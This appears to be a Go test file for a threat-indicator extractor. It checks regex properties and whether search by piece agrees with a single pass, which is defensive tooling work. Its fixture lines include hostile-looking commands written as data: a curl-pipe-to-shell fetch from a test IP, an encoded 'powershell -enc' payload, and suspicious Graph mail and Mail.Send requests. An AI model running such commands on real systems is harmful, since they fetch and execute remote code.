package indicator

import (
	"fmt"
	"regexp"
	"slices"
	"sort"
	"strings"
	"testing"
)

// onePass is Extract as one search of the whole text for each pattern: what
// the searches by piece must equal.
func (t Table) onePass(text string) []Match {
	seen := map[string]bool{}
	var matches []Match
	for _, p := range t.patterns {
		for _, loc := range p.rx.FindAllStringIndex(text, -1) {
			if p.notAfter != nil && p.notAfter.MatchString(text[loc[1]:]) {
				continue
			}
			if val := text[loc[0]:loc[1]]; !seen[val] {
				seen[val] = true
				matches = append(matches, Match{Type: p.typ, Value: val, Start: loc[0]})
			}
		}
	}
	sort.Slice(matches, func(i, j int) bool { return matches[i].Start < matches[j].Start })
	return matches
}

// A pattern is searched by piece only when no match of it can cross a line.
func TestStaysInLine(t *testing.T) {
	table, err := LoadPatterns()
	if err != nil {
		t.Fatal(err)
	}
	var whole []string
	for _, p := range table.patterns {
		if !p.inLine {
			whole = append(whole, p.typ)
		}
	}
	// The space between -EncodedCommand and its payload may be a line break.
	if want := []string{"EncodedCommand"}; !slices.Equal(whole, want) {
		t.Errorf("searched over the whole text: %q, want %q", whole, want)
	}
	for _, tt := range []struct {
		pattern string
		want    bool
	}{
		{`\b[a-f0-9]{32}\b`, true},
		{`(?i)https?://[^\s'"]+`, true},
		{`(?m)^key=\w+$`, true},
		{`a.b`, true},
		{`a\sb`, false},
		{`a[^x]b`, false},
		{`(?s)a.b`, false},
		{`a\nb`, false},
		{`^key`, false},
		{`key$`, false},
		{`\Akey`, false},
		{`x*`, false},
	} {
		if got := staysInLine(tt.pattern, mustCompile(t, tt.pattern)); got != tt.want {
			t.Errorf("staysInLine(%q) = %t, want %t", tt.pattern, got, tt.want)
		}
	}
}

// The text a pattern needs is one every match holds: it is read from the
// literals of the pattern, and a letter that may be either case is left out.
func TestNeeded(t *testing.T) {
	for _, tt := range []struct{ pattern, want string }{
		{`(?i)(?:https?|ftps?)://[^\s]+`, "://"},
		{`(?i)[a-z0-9]+@(?:[a-z0-9\-]+\.)+[a-z]{2,24}`, "@"},
		{`eyJ[A-Za-z0-9_\-]{8,}\.eyJ[A-Za-z0-9_\-]{8,}`, ".eyJ"},
		{`-----BEGIN [A-Z ]*PRIVATE KEY-----`, "PRIVATE KEY-----"},
		{`(?i)\bCVE-\d{4}-\d{4,7}\b`, "-"},
		{`(?i)https://login\.(?:a\.com|b\.net)(?:/x)?`, "://"},
		{`(?:AKIA|ASIA)[A-Z0-9]{16}`, "A"},
		{`a=1|b=2`, ""},
		{`x=1|yx=1z`, "x=1"},
		{`key=(?:x|y)?value`, "value"},
		{`(?:ab){2,}c`, "ab"},
		{`(?:ab){0,2}c`, "c"},
		{`(?:ab)*c+`, "c"},
		{`(?i)\b[a-f0-9]{64}\b`, ""},
		{`(?i)abc`, ""},
		{`a|[0-9]`, ""},
		{`(?:[A-Za-z0-9+/]{4}){16,}`, ""},
	} {
		if got := needed(tt.pattern); got != tt.want {
			t.Errorf("needed(%q) = %q, want %q", tt.pattern, got, tt.want)
		}
	}
	table, err := LoadPatterns()
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]string{}
	for _, p := range table.patterns {
		got[p.typ] = p.needs
	}
	for typ, want := range map[string]string{"URL": "://", "GraphEndpoint": "://", "Email": "@", "IPv4": ".", "Domain": ".", "GUID": "-", "SHA256": "", "Base64Blob": "", "OAuthScope": ""} {
		if got[typ] != want {
			t.Errorf("%s needs %q, want %q", typ, got[typ], want)
		}
	}
}

func TestCut(t *testing.T) {
	line := strings.Repeat("x", 99) + "\n"
	for _, tt := range []struct {
		name, text string
		pieces     int
	}{
		{"empty", "", 1},
		{"short", "a\nb\n", 1},
		{"one long line", strings.Repeat("x", 3*piece), 1},
		{"a long line and no more", strings.Repeat("x", 2*piece) + "\n", 1},
		{"many lines", strings.Repeat(line, 3*piece/len(line)+7), 4},
		{"no line break at the end", strings.Repeat(line, 2*piece/len(line)) + "tail", 2},
	} {
		t.Run(tt.name, func(t *testing.T) {
			bounds := cut(tt.text)
			if len(bounds)-1 != tt.pieces || bounds[0] != 0 || bounds[len(bounds)-1] != len(tt.text) {
				t.Fatalf("cut gives the bounds %v of a text of %d bytes, want %d pieces", bounds, len(tt.text), tt.pieces)
			}
			for i := 1; i < len(bounds)-1; i++ {
				if bounds[i] <= bounds[i-1] || tt.text[bounds[i]-1] != '\n' {
					t.Errorf("the piece that ends at %d does not end a line, or is empty", bounds[i])
				}
			}
		})
	}
}

// Searching a large text by piece gives exactly the matches of one pass,
// whatever falls on the line breaks the pieces are cut at.
func TestExtractByPieceEqualsOnePass(t *testing.T) {
	table, err := LoadPatterns()
	if err != nil {
		t.Fatal(err)
	}
	lines := []string{
		`{"ts":"2026-10-15T09:36:54Z","src":"144.172.64.%d","request":"GET https://graph.microsoft.com/v1.0/users/%d/messages?$top=50"}`,
		"curl -s http://198.51.100.%d/s.sh | sh  # ops%d@corp.example\r",
		"token eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.c2lnbmF0dXJl%d %d",
		"powershell -enc",
		"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQ%d%d",
		"d41d8cd98f00b204e9800998ecf8427e 10.0.%d.%d/24 CVE-2026-1234 build01.corp.internal.",
		"scope User.Read.All Mail.Send https://vault%d.vault.azure.net/secrets/s%d",
		"",
		strings.Repeat("QUJDREVGR0hJSktMTU5PUA==", 3) + " %d %d",
	}
	var b strings.Builder
	for i := 0; b.Len() < 2*piece+piece/3; i++ {
		fmt.Fprintf(&b, lines[i%len(lines)], i%250, i)
		b.WriteByte('\n')
	}
	for _, tt := range []struct{ name, text string }{
		{"lines", b.String()},
		{"no line break at the end", strings.TrimSuffix(b.String(), "\n")},
		{"a long line among them", b.String()[:piece] + strings.Repeat("10.9.8.7 ", piece/4) + b.String()[piece:]},
		{"small", b.String()[:small-1]},
	} {
		t.Run(tt.name, func(t *testing.T) {
			got, want := table.Extract(tt.text), table.onePass(tt.text)
			if len(want) < 100 {
				t.Fatalf("one pass finds %d indicators: the text does not try the pieces", len(want))
			}
			if !slices.Equal(got, want) {
				t.Errorf("by piece: %d indicators, one pass: %d; the two differ", len(got), len(want))
			}
		})
	}
}

func mustCompile(t *testing.T, pattern string) *regexp.Regexp {
	t.Helper()
	rx, err := regexp.Compile(pattern)
	if err != nil {
		t.Fatal(err)
	}
	return rx
}
